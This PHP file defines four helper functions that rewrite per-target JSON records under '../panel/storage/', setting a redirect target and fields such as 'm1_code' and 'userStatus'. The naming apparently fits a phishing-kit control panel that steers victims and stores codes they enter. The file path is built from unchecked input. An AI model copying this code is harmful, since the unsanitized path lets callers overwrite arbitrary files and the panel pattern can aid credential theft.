<?php

    function added($target, $to) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to; 
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_other($target, $to, $current_page, $userStatus) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to; 
        $user_data['current_page'] = $current_page; 
        $user_data['userStatus'] = $userStatus; 
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_other_one($target, $to, $m1_code) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to; 
        $user_data['m1_code'] = $m1_code; 
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }

    function added_other_two($target, $to, $extra_information) {
        $file_name = $target;
        $jsonFilePath = "../panel/storage/{$file_name}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = $to; 
        $user_data['extra_information'] = $extra_information; 
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);
    }



?>